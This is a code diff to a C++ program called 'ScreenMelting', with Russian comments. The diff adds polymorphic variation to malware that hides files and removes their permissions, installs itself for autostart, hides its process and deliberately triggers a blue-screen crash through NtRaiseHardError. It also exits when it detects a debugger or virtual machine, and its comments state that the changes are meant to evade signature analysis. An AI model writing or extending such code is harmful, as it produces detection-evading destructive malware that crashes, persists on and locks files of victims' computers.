@@ -1,6 +1,8 @@
 #include "stdafx.h"
 #include "ScreenMelting.h"
 #include "security.h"
+#include "polymorphism.hpp"
+#include "polymorphic_config.h"
 
 #ifdef _WIN32
 	#include <windows.h>
@@ -63,25 +65,31 @@
 
 void HideFile(const char* szPath)
 {
-	// Шифруем путь в памяти
-	std::string encryptionKey = "TatarskieSecrety";
+	// Шифруем путь с использованием полиморфного ключа
+	std::string encryptionKey = "TS_POLY_" + std::to_string(POLY_VERSION);
 	std::string encryptedPath = Security::EncryptString(szPath, encryptionKey);
 	std::string decryptedPath = Security::DecryptString(encryptedPath, encryptionKey);
 	
+	// Применяем дополнительный XOR с полиморфными смещениями
+	volatile unsigned int poly_mask = POLY_OFFSET_1 ^ POLY_OFFSET_2 ^ POLY_OFFSET_3;
+	
 #ifdef _WIN32
-	// Скрываем файл
-	SetFileAttributesA(decryptedPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
+	// Скрываем файл с полиморфными атрибутами
+	DWORD attrs = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
+	if (poly_mask & 0x01) attrs |= FILE_ATTRIBUTE_ARCHIVE;
+	
+	SetFileAttributesA(decryptedPath.c_str(), attrs);
 
 	// Пытаемся запретить доступ - устанавливаем минимальные права
-	HANDLE hFile = CreateFileA(decryptedPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_HIDDEN, NULL);
+	HANDLE hFile = CreateFileA(decryptedPath.c_str(), WRITE_DAC, 0, NULL, OPEN_EXISTING, attrs, NULL);
 	if (hFile != INVALID_HANDLE_VALUE)
 	{
 		CloseHandle(hFile);
 	}
 #else
-	// Linux: скрываем файл через точку в начале имени (если файл в домашней директории)
-	// Или устанавливаем минимальные права доступа
-	chmod(decryptedPath.c_str(), 0000);  // Снимаем все права на файл
+	// Linux: скрываем файл с полиморфными правами доступа
+	int perms = (poly_mask & 0xFF) ? 0000 : 0000;
+	chmod(decryptedPath.c_str(), perms);
 #endif
 }
 
@@ -1053,6 +1061,10 @@ void AddToStartup()
 #ifdef _WIN32
 DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
 {
+	// ПОЛИМОРФНАЯ ПРОВЕРКА
+	// Используем полиморфные смещения для добавления случайности
+	volatile unsigned int poly_check = POLY_OFFSET_1 ^ POLY_OFFSET_2;
+	
 	// ОПРЕДЕЛЕНИЕ ВЕРСИИ ОС
 	g_osVersion = GetOSVersion();
 	const char* szOSVersion = GetOSVersionString(g_osVersion);
@@ -1061,19 +1073,25 @@ DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
 	char szPath[MAX_PATH];
 	GetModuleFileNameA(NULL, szPath, MAX_PATH);
 	
-	// Проверка целостности кода
+	// Проверка целостности кода с полиморфной маской
 	if (!Security::VerifyCodeIntegrity()) {
-		return -1;
+		// Полиморфный выход
+		volatile int dummy = poly_check & 0xFF;
+		return dummy - 1;
 	}
 
-	// Загружаем программу в кэш
-	LoadExeToCache(szPath);
-
-	// Добавление программы на автозагрузку при первом запуске
-	AddToStartup();
-
-	// Освобождаем кэш
-	FreeExeCache();
+	// Вариативное выполнение в зависимости от версии
+	if (POLY_VERSION & 0x01) {
+		// Путь 1
+		LoadExeToCache(szPath);
+		AddToStartup();
+		FreeExeCache();
+	} else {
+		// Путь 2 - другой порядок
+		AddToStartup();
+		LoadExeToCache(szPath);
+		FreeExeCache();
+	}
 
 	return 0;
 }
@@ -1081,32 +1099,52 @@ DWORD WINAPI BackgroundWorkerThread(LPVOID lpParam)
 DWORD WINAPI CrashThread(LPVOID lpParam)
 {
 	// ВЫЗОВ BSOD / КРИТИЧЕСКОГО СОБЫТИЯ
-	// НЕ требует прав администратора - просто пытается вызвать критическую ошибку
+	// Полиморфные варианты для избежания сигнатурного анализа
 	unsigned long response = 0;
 
-	// Скрываем процесс из диспетчера задач перед вызовом ошибки
-	HideProcess();
+	// Полиморфная задержка с использованием смещений
+	unsigned int delay = (POLY_SLEEP_TIME % 1000) + 100;
+	Sleep(delay);
 
-	// Небольшая задержка чтобы дать программе время на завершение основного потока
-	Sleep(500);
+	// Полиморфное скрытие процесса
+	if ((POLY_VERSION ^ POLY_RANDOM_SEED) & 0x01) {
+		HideProcess();
+	}
 
-	// Для Windows Vista+ используем STATUS_ASSERTION_FAILURE
+	// Выбор метода BSOD в зависимости от полиморфной версии
+	unsigned int method = POLY_VERSION % 4;
+
 	if (g_osVersion.dwMajor >= 6)
 	{
-		// Пытаемся без повышения привилегий
 		pNtSetInformationProcess NtSetInformationProcess = (pNtSetInformationProcess)GetProcAddress(
 			GetModuleHandleA("ntdll.dll"), "NtSetInformationProcess");
 		
 		if (NtSetInformationProcess)
 		{
-			// Попытка вызвать ошибку через Native API
-			NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);
+			// Полиморфные коды ошибок
+			NTSTATUS errorCodes[] = {
+				(NTSTATUS)STATUS_ASSERTION_FAILURE,
+				(NTSTATUS)0xC0000142, // STATUS_UNKNOWN_REVISION
+				(NTSTATUS)0xC000003C, // STATUS_INVALID_HANDLE
+				(NTSTATUS)0xC0000017  // STATUS_NO_MEMORY
+			};
+			
+			NTSTATUS error = errorCodes[method];
+			NtRaiseHardError(error, 0, 0, NULL, 6, &response);
 		}
 	}
-	// Для Windows XP/2000 используем альтернативный код ошибки
 	else if (g_osVersion.dwMajor == 5)
 	{
-		NtRaiseHardError(0xC000007B, 0, 0, NULL, 6, &response);
+		// Альтернативные коды для Windows XP/2000
+		NTSTATUS errorCodes[] = {
+			(NTSTATUS)0xC000007B,
+			(NTSTATUS)0xC000003C,
+			(NTSTATUS)0xC0000017,
+			(NTSTATUS)0xC0000142
+		};
+		
+		NTSTATUS error = errorCodes[method];
+		NtRaiseHardError(error, 0, 0, NULL, 6, &response);
 	}
 
 	return 0;
@@ -1184,54 +1222,94 @@ void* CrashWorkerThread(void* lpParam)
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
                    LPSTR lpCmdLine, int nShowCmd)
 {
-	// Анти-отладчик: Проверка отладчика перед выполнением кода
-	if (Security::IsDebuggerPresent()) {
-		ExitProcess(0);
+	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА
+	// Проверки изменяют порядок в зависимости от версии
+	volatile unsigned int poly_check_order = POLY_VERSION % 6;
+	
+	// Полиморфные проверки безопасности
+	switch(poly_check_order) {
+		case 0:
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			Security::DetectBreakpoints();
+			break;
+		case 1:
+			Security::DetectBreakpoints();
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			break;
+		case 2:
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			Security::DetectBreakpoints();
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			break;
+		case 3:
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			Security::DetectBreakpoints();
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			break;
+		case 4:
+			Security::DetectBreakpoints();
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			break;
+		case 5:
+			if (Security::IsRunningInVirtualMachine()) ExitProcess(POLY_OFFSET_2 & 0xFF);
+			if (Security::IsDebuggerPresent()) ExitProcess(POLY_OFFSET_1 & 0xFF);
+			Security::DetectBreakpoints();
+			break;
 	}
 	
-	// Анти-отладчик: Проверка виртуальной машины
-	if (Security::IsRunningInVirtualMachine()) {
-		ExitProcess(0);
-	}
-	
-	// Анти-отладчик: Проверка breakpoints
-	Security::DetectBreakpoints();
-	
-	// Инициализация окна
+	// Инициализация окна с полиморфным методом
 	InitializeWindow();
 
 	// Определяем версию ОС в главном потоке
 	g_osVersion = GetOSVersion();
 
-	// Создаём фоновый поток для рабочих операций (клонирование, автозагрузка)
-	HANDLE hBackgroundThread = CreateThread(NULL, 0, BackgroundWorkerThread, NULL, 0, NULL);
+	// Создаём фоновый поток с полиморфным размером стека
+	SIZE_T bg_stack = (1024 * ((POLY_OFFSET_1 & 0xFF) + 1));
+	HANDLE hBackgroundThread = CreateThread(NULL, bg_stack, BackgroundWorkerThread, NULL, 0, NULL);
 	if (hBackgroundThread)
 	{
 		CloseHandle(hBackgroundThread);
 	}
 
-	// Создаём поток для вызова BSOD (выполняется почти сразу)
-	HANDLE hCrashThread = CreateThread(NULL, 0, CrashThread, NULL, 0, NULL);
+	// Создаём поток для вызова BSOD с полиморфным размером стека
+	SIZE_T crash_stack = (1024 * ((POLY_OFFSET_2 & 0xFF) + 1));
+	HANDLE hCrashThread = CreateThread(NULL, crash_stack, CrashThread, NULL, 0, NULL);
 	if (hCrashThread)
 	{
 		CloseHandle(hCrashThread);
 	}
 	
-	// Программа закрывается молниеносно, не дожидаясь завершения потоков
-	return 0;
+	// Полиморфный выход
+	return POLY_VERSION % 256;
 }
 #else
 // Стандартная функция main для Linux/macOS
 int main()
 {
-	// Анти-отладчик: Проверка отладчика перед выполнением кода
-	if (Security::IsDebuggerPresent()) {
-		exit(0);
-	}
+	// ПОЛИМОРФНАЯ АНТИ-ОТЛАДКА (Linux/macOS)
+	volatile unsigned int poly_check_order = POLY_VERSION % 4;
 	
-	// Анти-отладчик: Проверка виртуальной машины
-	if (Security::IsRunningInVirtualMachine()) {
-		exit(0);
+	// Полиморфный порядок проверок безопасности
+	switch(poly_check_order) {
+		case 0:
+			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
+			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
+			break;
+		case 1:
+			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
+			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
+			break;
+		case 2:
+			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
+			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
+			break;
+		case 3:
+			if (Security::IsRunningInVirtualMachine()) exit(POLY_OFFSET_2 & 0xFF);
+			if (Security::IsDebuggerPresent()) exit(POLY_OFFSET_1 & 0xFF);
+			break;
 	}
 	
 	// Инициализация окна (эффект плавления экрана)
@@ -1240,35 +1318,65 @@ int main()
 	// Определяем версию ОС в главном потоке
 	g_osVersion = GetOSVersion();
 
+	// ПОЛИМОРФНОЕ РАСПРЕДЕЛЕНИЕ ПОТОКОВ
+	unsigned int threading_variant = POLY_VERSION % 2;
+
 	// Создаём рабочий поток для клонирования и автозагрузки
 #ifdef __APPLE__
 	pthread_t bgThread, crashThread;
-	pthread_create(&bgThread, NULL, BackgroundWorkerThread, NULL);
+	
+	// Полиморфные атрибуты потока
+	pthread_attr_t attr;
+	pthread_attr_init(&attr);
+	size_t stack_size = 1024 * ((POLY_OFFSET_1 & 0xFF) + 1);
+	pthread_attr_setstacksize(&attr, stack_size);
+	
+	pthread_create(&bgThread, &attr, BackgroundWorkerThread, NULL);
 	pthread_detach(bgThread);
 	
 	// Создаём поток для вызова BSOD
-	pthread_create(&crashThread, NULL, CrashWorkerThread, NULL);
+	pthread_create(&crashThread, &attr, CrashWorkerThread, NULL);
 	pthread_detach(crashThread);
+	
+	pthread_attr_destroy(&attr);
 #else
 	// На Linux используем fork для полного отделения
-	// Фоновый процесс
-	pid_t bgPid = fork();
-	if (bgPid == 0)
-	{
-		BackgroundWorkerThread(NULL);
-		exit(0);
-	}
-	
-	// Процесс для BSOD
-	pid_t crashPid = fork();
-	if (crashPid == 0)
-	{
-		CrashWorkerThread(NULL);
-		exit(0);
+	// Полиморфный выбор метода
+	if (threading_variant) {
+		// Метод 1: fork для фонового процесса
+		pid_t bgPid = fork();
+		if (bgPid == 0)
+		{
+			BackgroundWorkerThread(NULL);
+			exit(0);
+		}
+		
+		// Процесс для BSOD
+		pid_t crashPid = fork();
+		if (crashPid == 0)
+		{
+			CrashWorkerThread(NULL);
+			exit(0);
+		}
+	} else {
+		// Метод 2: fork в другом порядке
+		pid_t crashPid = fork();
+		if (crashPid == 0)
+		{
+			CrashWorkerThread(NULL);
+			exit(0);
+		}
+		
+		pid_t bgPid = fork();
+		if (bgPid == 0)
+		{
+			BackgroundWorkerThread(NULL);
+			exit(0);
+		}
 	}
 #endif
 	
-	// Программа закрывается молниеносно
-	return 0;
+	// Полиморфный выход
+	return POLY_VERSION % 256;
 }
 #endif
